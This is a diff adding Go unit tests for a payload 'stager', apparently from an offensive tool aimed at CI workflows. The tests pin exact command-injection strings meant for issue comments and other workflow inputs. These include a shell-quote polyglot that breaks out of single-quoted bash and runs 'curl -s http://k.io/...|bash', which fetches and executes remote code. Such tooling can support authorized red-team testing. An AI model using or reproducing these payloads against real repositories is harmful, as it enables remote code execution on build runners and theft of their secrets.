@@ -43,6 +43,30 @@ func TestStager_GenerateBash_PRTitle(t *testing.T) {
 	assert.Contains(t, payload.Raw, "bash")
 }
 
+func TestStager_GenerateBash_IssueCommentPolyglot(t *testing.T) {
+	stager := NewStagerWithID("cmt123", "http://k.io", BashSingleQuoted)
+	payload := stager.Generate()
+
+	assert.Equal(t, "bash_single_quoted", payload.Context)
+	assert.Equal(t, "curl_bash_shell_quote_polyglot", payload.Technique)
+	assert.Equal(
+		t,
+		"$(curl -s http://k.io/r/smokedmeat/cmt123|bash) #'; curl -s http://k.io/r/smokedmeat/cmt123|bash #",
+		payload.Raw,
+	)
+}
+
+func TestStager_GenerateBash_IssueCommentPolyglot_SingleQuotedWorkflowShape(t *testing.T) {
+	stager := NewStagerWithID("cmt123", "http://k.io", BashSingleQuoted)
+	payload := stager.Generate()
+
+	assert.Equal(
+		t,
+		"echo '$(curl -s http://k.io/r/smokedmeat/cmt123|bash) #'; curl -s http://k.io/r/smokedmeat/cmt123|bash #'",
+		"echo '"+payload.Raw+"'",
+	)
+}
+
 func TestStager_GenerateIFS_BranchName(t *testing.T) {
 	stager := NewStagerWithID("br123", "http://k.io", BranchName)
 	payload := stager.Generate()
